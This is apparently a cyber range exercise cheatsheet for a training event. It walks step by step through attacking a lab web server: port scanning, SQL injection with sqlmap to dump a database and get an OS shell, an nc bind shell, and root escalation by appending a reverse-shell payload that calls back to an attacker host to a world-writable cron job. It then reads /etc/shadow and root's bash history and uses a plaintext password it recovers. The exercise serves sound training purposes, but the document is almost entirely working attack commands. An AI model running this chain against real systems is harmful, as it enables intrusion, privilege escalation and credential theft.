# CDIS Cyber Range | EU Cyber Attaché Exercise Cheatsheet

## 1) Identify the network services

```sh
nmap 10.0.3.193
```

## 2) Signup on the webpage

- `http://10.0.3.193/php/inscription.php`

## 3) Identify an old version of a webpage

- `http://10.0.3.193/php/recherche_old.php` 
  
## 4) Misuse input validation vulnerability

- Enter a single quote (`'`)  into the text field and press the button
- Enter `' or 1=1#` into the text field and press the button

## 5) Retrieve arbitrary data from the database through SQL injection

- Copy the request below and paste it into a text file called `sqli.txt`
```sh
POST /php/recherche_old.php HTTP/1.1
Host: 10.0.3.193
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://10.0.3.193
Connection: close
Referer: http://10.0.3.193/php/recherche_old.php
Cookie: PHPSESSID=a62f5c5fio2i8l8spkas8mfjt6
Upgrade-Insecure-Requests: 1

recherche=emre&btnRechercher=Rechercher
```
- Copy the PHPSESSID from your browser and replace the value found in the `sqli.txt`

### 5.1 Execute `sqlmap` to identify database names

```sh
sqlmap -r sqli.txt --dbms=mysql --dbs 
```

### 5.2 Execute `sqlmap` to get the records found in the in the `cuiteur` database
```sh
sqlmap -r sqli.txt --dbms=mysql -D cuiteur --dump
```

## 6) Grant the initial shell access

### 6.1 Execute `sqlmap` to grant a SQL shell connection via SQL injection
```sh
sqlmap -r sqli.txt --dbms=mysql --os-shell
```

### 6.2 Execute OS commands through the SQL shell connection
```sh
whoami

hostname

pwd
```

### 6.3 Execute the following command to have a more convenient bind shell access
```sh
rm /tmp/pipe; mkfifo /tmp/pipe; /bin/sh /tmp/pipe | nc -l 5555 > /tmp/pipe
```

### 6.4 Execute the following command to establish a `nc` bind connection (Switch to another terminal on your **Kali**)
```sh
nc 10.0.3.193 5555
```

### 6.5 Execute some OS commands through the `nc` connection
```sh
whoami

pwd
```

### 6.6 Identify a file with a promising filename
```sh
cd ..

ls

ls /var/www/upload

# Download the file from the web browser
http://10.0.3.193/upload/leaks.zip

unzip leaks.zip
```

### 6.7 Realize also that you have limited access
```sh
cat /etc/shadow
```

## 7) Identify a vulnerable configuration

### 7.1 Identify a world-writable directory
```sh
find / -writable -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/var/www/*" -exec ls -al {} \; 2>/dev/null
```

## 8) Escalate privileges to root

### 8.1 Examine the cron job with write access for everyone 
```sh
cd /etc/cron.hourly
cat cuiteur-cleaning
```
### 8.2 Open a listener on the **Kali** for a reverse shell connection with root privileges
```sh
sudo nc -nlvp 7777
``` 
### 8.3 Edit the cron job to have a reverse shell payload inside
```sh
echo "rm /tmp/pipe; mkfifo /tmp/pipe; nc 192.168.0.13 7777 0</tmp/pipe | /bin/sh >/tmp/pipe 2>&1" >> cuiteur-cleaning
```

### 8.4 Execute some OS commands through the `nc` connection
```sh
whoami

pwd

cat /etc/shadow
```

## 9) Identify a plaintext password in the bash history  

### 9.1 Perform post-exploitation activities
```sh
cat /root/.bash_history
```

### 9.2 Access the password-protected file
```sh
unzip -P "x5^#CNYK-Ng@MkHZR748" /home/emre/Downloads/leaks.zip
```
